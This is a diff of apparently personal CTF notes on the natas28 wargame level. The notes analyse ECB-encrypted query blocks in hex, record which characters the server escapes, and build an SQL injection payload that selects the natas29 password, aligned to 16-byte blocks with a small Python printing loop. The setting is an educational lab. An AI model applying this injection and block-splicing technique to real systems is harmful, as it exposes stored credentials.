@@ -56,8 +56,20 @@ ca 8c f4 e6 10 91 3a ba e3 9a 06 76 19 20 4a 5a
 aaaaaaaaaa
 G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oec4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D
 
+1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c 
+dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 
+c0 87 2d ee 8b c9 0b 11 56 91 3b 08 a2 23 a3 9e 
+73 8a 5f fb 4a 45 00 24 67 75 17 5a e5 96 bb d6 
+f3 4d f3 39 c6 9e dc e1 1f 66 50 bb ce d6 27 02
+
 bbbbbbbbbb
 G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJcgFy9Kftj4uxTZFMlx6iWc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D
+
+1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c 
+dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 
+5c 80 5c bd 29 fb 63 e2 ec 53 64 53 25 c7 a8 96 
+73 8a 5f fb 4a 45 00 24 67 75 17 5a e5 96 bb d6 
+f3 4d f3 39 c6 9e dc e1 1f 66 50 bb ce d6 27 02
 
 in the above examples, the hex for the line with the quote is different than the other two
 what if we sent a bunch of single quotes?
@@ -81,6 +93,7 @@ most likely the server is escaping the single quotes, which means that there are
 so, there are 10 bytes we control in block 3, 48 in blocks 4-6, and 6 bytes in block 7.
 we also now know that the server escapes single quotes, so we should find a way around that too.
 \ is also escaped, so we can't use \\'
+- (dash) is not esacped...interesting.
 
 something like
 ' select * from users where username = natas29 -- 
@@ -99,5 +112,18 @@ so if we want to inject into this...
 ...like 'aaaaaaaaa'; select password from users where username = natas29
 
 putting this into 16 character blocks...
-; select passw
+aaaaaaaaa'
+; select passwo     7b 28 d1 ff 83 cc 1b fb 43 ca 13 66 19 47 dc 39 
+rd from users wh    ee 65 78 7b e7 bf dc 9d 66 20 8f e7 96 a2 3e f0 
+ere username lik    1c e5 0d 2d f4 bd 4d f3 e0 03 a2 d2 e7 35 f8 70 
+e natas29;-- aaa    e8 5d f0 50 61 3c 52 83 63 c9 c4 41 23 67 f2 8a 
+
+loop for printing the payload in 16 character blocks
+for i in range(5):
+    if i == 0:
+        print(''.join(chars[0:15]))
+    if i > 0:
+        x = i*16 - 1
+        y = x + 16
+        print(''.join(chars[x:y]))
 
